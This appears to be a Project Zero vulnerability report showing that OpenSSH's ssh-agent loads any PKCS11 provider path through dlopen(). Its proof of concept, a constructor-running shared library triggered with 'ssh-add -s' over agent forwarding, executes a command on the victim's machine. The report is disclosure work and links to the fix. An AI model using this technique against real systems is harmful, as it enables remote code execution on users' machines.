Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1009

The OpenSSH agent permits its clients to load PKCS11 providers using the commands SSH_AGENTC_ADD_SMARTCARD_KEY and SSH_AGENTC_ADD_SMARTCARD_KEY_CONSTRAINED if OpenSSH was compiled with the ENABLE_PKCS11 flag (normally enabled) and the agent isn't locked. For these commands, the client has to specify a provider name. The agent passes this provider name to a subprocess (via ssh-agent.c:process_add_smartcard_key -> ssh-pkcs11-client.c:pkcs11_add_provider -> ssh-pkcs11-client.c:send_msg), and the subprocess receives it and passes it to dlopen() (via ssh-pkcs11-helper.c:process -> ssh-pkcs11-helper.c:process_add -> ssh-pkcs11.c:pkcs11_add_provider -> dlopen). No checks are performed on the provider name, apart from testing whether that provider is already loaded.

This means that, if a user connects to a malicious SSH server with agent forwarding enabled and the malicious server has the ability to place a file with attacker-controlled contents in the victim's filesystem, the SSH server can execute code on the user's machine.

To reproduce the issue, first create a library that executes some command when it is loaded:

$ cat evil_lib.c
#include <stdlib.h>
__attribute__((constructor)) static void run(void) {
  // in case you're loading this via LD_PRELOAD or LD_LIBRARY_PATH,
  // prevent recursion through system()
  unsetenv("LD_PRELOAD");
  unsetenv("LD_LIBRARY_PATH");
  system("id > /tmp/test");
}
$ gcc -shared -o evil_lib.so evil_lib.c -fPIC -Wall

Connect to another machine using "ssh -A". Then, on the remote machine:

$ ssh-add -s [...]/evil_lib.so
Enter passphrase for PKCS#11: [just press enter here]
SSH_AGENT_FAILURE
Could not add card: [...]/evil_lib.so

At this point, the command "id > /tmp/test" has been executed on the machine running the ssh agent:

$ cat /tmp/test
uid=1000(user) gid=1000(user) groups=[...]


Fixed in http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.214&r2=1.215&f=h